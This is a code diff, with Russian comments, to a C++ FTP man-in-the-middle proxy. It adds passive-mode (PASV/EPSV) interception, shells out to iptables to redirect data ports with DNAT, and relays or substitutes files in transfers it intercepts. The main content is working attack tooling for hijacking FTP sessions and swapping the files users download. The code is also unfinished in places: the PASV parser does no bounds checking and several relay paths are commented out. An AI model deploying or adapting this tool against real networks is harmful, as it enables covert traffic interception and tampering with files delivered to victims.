@@ -57,6 +57,49 @@ bool parse_port(const std::string& port_cmd, std::string& ip, int& port) {
     return true;
 }
 
+bool parse_pasv(const std::string& input, std::string& ip, int& port) {
+    std::vector<int> numbers;
+    
+    // Найти позиции скобок
+    size_t start = input.find('(');
+    size_t end = input.find(')');
+    
+    // Проверить, что скобки найдены и открывающая перед закрывающей
+    if (start == std::string::npos || end == std::string::npos || start >= end) {
+        return false;
+    }
+    
+    // Извлечь подстроку между скобками
+    std::string content = input.substr(start + 1, end - start - 1);
+    
+    // Обработка подстроки
+    size_t pos = 0;
+    std::string token;
+    while (pos < content.length()) {
+        // Пропустить запятые и пробелы
+        if (content[pos] == ',' || std::isspace(content[pos])) {
+            ++pos;
+            continue;
+        }
+        
+        // Извлечь последовательность цифр
+        token.clear();
+        while (pos < content.length() && std::isdigit(content[pos])) {
+            token += content[pos];
+            ++pos;
+        }
+        
+        // Преобразовать токен в число
+        if (!token.empty()) {
+            numbers.push_back(std::stoi(token));
+        }
+    }
+    
+    ip = std::to_string(numbers[0]) + "." + std::to_string(numbers[1]) + "." + std::to_string(numbers[2]) + "." + std::to_string(numbers[3]);
+    port = numbers[4] * 256 + numbers[5];
+    return true;
+}
+
 bool Session::openClientDataSocket(const std::string& ip, int port) {
     if (this->_client_data > 0)
         close(this->_client_data);   // closing old socket
@@ -100,7 +143,7 @@ bool Session::openServerDataSocket(int& port) {
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_addr.s_addr = INADDR_ANY;
-    port = generate_random_port();
+    //port = generate_random_port();
     serverAddr.sin_port = htons(port); 
 
     if (bind(this->_server_data, (sockaddr*)&serverAddr, sizeof serverAddr)) {
@@ -185,9 +228,26 @@ bool Session::TranslateMessages() {
             msg = this->receiveMsg(this->server);
             this->sendMsg(this->client, msg);
             this->_hold_session = false;
+            return this->_hold_session;
+        }
+        if (cmd == "SIZE") {
+            this->sendMsg(this->server, msg);
+            msg = this->receiveMsg(this->server);
+            if (msg.substr(0, 3) == "550") {
+                std::cout << "Requested file does not exists on the server! Skipping..." << std::endl;
+                this->sendMsg(this->client, msg);
+                close(this->_server_data);
+                close(this->_client_data);
+                return this->_hold_session;
+            }
+            size_t size = std::stoi(msg.substr(4));
+            std::cout << "[+] Set buffer size to " << size << std::endl;
+            this->sendMsg(this->client, msg);
+            return this->_hold_session;
         }
         if (cmd == "RETR") {
             std::string filename = msg.substr(5);
+            std::cout << "[+] Requested filename: " << filename << std::endl; 
             filename = filename.erase(filename.find_last_not_of(" \r\n") + 1);
             this->sendMsg(this->server, msg);
             msg = this->receiveMsg(this->server);
@@ -214,17 +274,22 @@ bool Session::TranslateMessages() {
                 std::string sub_filename = substitution.get_sub();
                 std::cout << "Replacing file " << filename << " with file " << sub_filename << std::endl;
                 while (size > 0)
-                    size = recv(_sock, buffer, this->buffer_size, 0); // Receiving file from server, but do not send to client
+                    //size = recv(_sock, buffer, this->buffer_size, 0); // Receiving file from server, but do not send to client
+                    size = recv(this->_client_data, buffer, this->buffer_size, 0);
                 std::ifstream file(sub_filename, std::ios::binary);
                 while (file.read(buffer, this->buffer_size))
-                    send(this->_client_data, buffer, file.gcount(), 0);
+                    //send(this->_client_data, buffer, file.gcount(), 0);
+                    send(_sock, buffer, file.gcount(), 0);
                 if (file.gcount() > 0)
-                    send(this->_client_data, buffer, file.gcount(), 0);
+                    //send(this->_client_data, buffer, file.gcount(), 0);
+                    send(_sock, buffer, file.gcount(), 0);
             } else {
                 std::cout << "Substitution for file " << filename << " not found! Relay data tranfser..." << std::endl;
                 while (size > 0) {
-                    size = recv(_sock, buffer, this->buffer_size, 0);
-                    send(this->_client_data, buffer, size, 0);
+                    //size = recv(_sock, buffer, this->buffer_size, 0);
+                    //send(this->_client_data, buffer, size, 0);
+                    size = recv(this->_client_data, buffer, this->buffer_size, 0);
+                    send(_sock, buffer, size, 0);
                 }
             }
             msg = this->receiveMsg(this->server);
@@ -239,25 +304,38 @@ bool Session::TranslateMessages() {
         }
         if (cmd == "LIST") {
             this->sendMsg(this->server, msg);
+            // 125 Data connection already open
+            msg = this->receiveMsg(this->server);
+            std::cout << "[+] Server: " << msg << std::endl; 
+            this->sendMsg(this->client, msg);
             char* buffer = new char[this->buffer_size]{};
             int size = 1;
             sockaddr_in clientAddr;
             socklen_t clientAddrLen = sizeof clientAddr;
+            std::cout << "[*] Watiting client connect to server..." << std::endl;
             int _sock = accept(this->_server_data, (sockaddr*)&clientAddr, &clientAddrLen);
             if (_sock < 0) {
                 std::cout << "Could not accept server connection for data transfer!" << std::endl;
                 return this->_hold_session;
             }
+            std::cout << "[+] Client connected to server!" << std::endl;
+            std::cout << "[*] Buffer size: " << this->buffer_size << std::endl;
             while (size > 0) {
-                size = recv(_sock, buffer, this->buffer_size, 0);
-                send(this->_client_data, buffer, size, 0);
+                //size = recv(_sock, buffer, this->buffer_size, 0);
+                //send(this->_client_data, buffer, size, 0);
+                std::cout << "[*] Retransmitting data..." << std::endl;
+                size = recv(this->_client_data, buffer, this->buffer_size, 0);
+                send(_sock, buffer, size, 0);
             }
             delete[] buffer;
             close(_sock);
             close(this->_server_data);
             close(this->_client_data);
-            msg = this->receiveMsg(this->server);
-            this->sendMsg(this->client, msg);
+            //msg = this->receiveMsg(this->server);
+            //msg = this->receiveMsg(this->client);
+            //std::cout << "[+] Client: " << msg << std::endl;
+            //this->sendMsg(this->client, msg);
+            //this->sendMsg(this->server, msg);
             return this->_hold_session;
         }
         if (cmd == "PORT") {
@@ -276,6 +354,39 @@ bool Session::TranslateMessages() {
             this->sendMsg(this->server, port_cmd);
             msg = this->receiveMsg(this->server);
             this->sendMsg(this->client, msg);
+            return this->_hold_session;
+        }
+        if (cmd == "EPSV") {
+            this->sendMsg(this->server, msg);
+            msg = this->receiveMsg(this->server);
+            std::cout << "[*] Server: " << msg << std::endl;
+            std::string port;
+            std::stringstream ss(msg);
+            std::getline(ss, port, '|');
+            std::getline(ss, port, '|');
+            std::getline(ss, port, '|');
+            std::getline(ss, port, '|');
+            
+            int _port = std::stoi(port);
+            std::string rule ="iptables -t nat -A PREROUTING -p tcp --dport " + port + " -j DNAT --to-destination 192.168.7.1:" + port ;
+            system(rule.c_str());
+            this->_hold_session = this->openClientDataSocket(this->task.GetServer(), _port) & this->openServerDataSocket(_port);
+            this->sendMsg(this->client, msg);
+            
+            return this->_hold_session;
+        }
+        if (cmd == "PASV") {
+            this->sendMsg(this->server, msg);
+            msg = this->receiveMsg(this->server);
+            std::string ip;
+            int port;
+            parse_pasv(msg, ip, port);
+            std::cout << "[+] Mitm in passive mode. Server socket: " << ip << ":" << port << std::endl;
+            std::string rule ="iptables -t nat -A PREROUTING -p tcp --dport " + std::to_string(port) + " -j DNAT --to-destination 192.168.7.1:" + std::to_string(port);
+            system(rule.c_str());
+            this->sendMsg(this->client, msg);
+            this->_hold_session = this->openClientDataSocket(ip, port) & this->openServerDataSocket(port);
+
             return this->_hold_session;
         }
         this->sendMsg(this->server, msg);
